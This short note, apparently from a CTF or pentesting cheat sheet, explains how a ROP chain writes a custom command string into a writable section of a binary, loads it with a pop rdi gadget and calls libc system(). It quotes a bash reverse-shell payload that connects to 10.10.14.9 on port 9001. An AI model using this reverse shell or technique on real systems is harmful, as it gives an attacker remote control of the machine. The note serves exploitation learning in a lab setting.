If you want to write a payload to a custom location in the memory of the program, for example custom parameter to pass to `system` with your rop chain : `"bash -c 'bash -i >& /dev/tcp/10.10.14.9/9001 0>&1'"`  didn't exist in the target binary or the libc instead of `"/bin/bash"`.

You first need to write your payload to a writable location in the memory of the target binary then use a gadget that `pop_rdi` to the memory address of your newly written payload.
Then call `system()` from libc.

For more info, see https://youtu.be/1MDqn1kBHQM?t=1818

To find a writable memory space:
```bash
readelf -S mybinary.elf
# Then check the output for a "WA" which mean "Write Access"
# Write Access in .data section is good !
# This is generally an offset that you need to add to the base of the binary
```

